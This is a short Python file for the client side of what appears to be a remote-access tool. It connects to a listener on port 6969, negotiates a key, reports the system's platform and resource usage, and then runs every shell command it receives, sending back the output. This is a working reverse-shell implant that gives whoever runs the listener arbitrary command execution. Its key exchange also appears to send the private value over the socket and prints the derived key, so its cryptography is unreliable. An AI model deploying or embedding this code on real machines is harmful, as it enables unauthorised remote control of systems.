# from rsat import Tool
import socket
import subprocess
import psutil 
import os
from DFH import Dfh_client as Dfh
from Client_mod import Client
import platform

df = Dfh()
a, mod = df.ret_known()
secret = df.private_expo()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = "localhost"
PORT = 6969
while True:
    try:
        s.connect((HOST, PORT))
        break
    except Exception as e:
        pass
s.send(f"{a}-{mod}-{secret}".encode())
secret = int(s.recv(1024).decode())
key = str(df.genrate_secret(secret)).encode()
key = key[:16]
print(key)

client = Client(key, s)
client.send(platform.platform())


def shell():
    try:
        while True:
            command = client.recv()
            print(command)
            if command.startswith("cd"):
                try:
                    os.chdir(command.split(maxsplit=1)[1])
                    output = f"Changed to {os.getcwd()}"
                except Exception as e:
                    output = f"Error: {e}"
            elif command.lower() == "utils":
                output = ("####CPUM#### " + f"{psutil.cpu_percent(interval=1)}-{psutil.virtual_memory().percent}-{psutil.disk_usage('/').percent}")
            elif command == "..SYN..":
                output = ""
            else:
                try:
                    output = subprocess.getoutput(command)
                except Exception as e:
                    output = f"Error executing command: {e}"
            
            client.send(output)
    except Exception as e:
        print(f"exception occured {e}")

if __name__ == "__main__":
    shell()
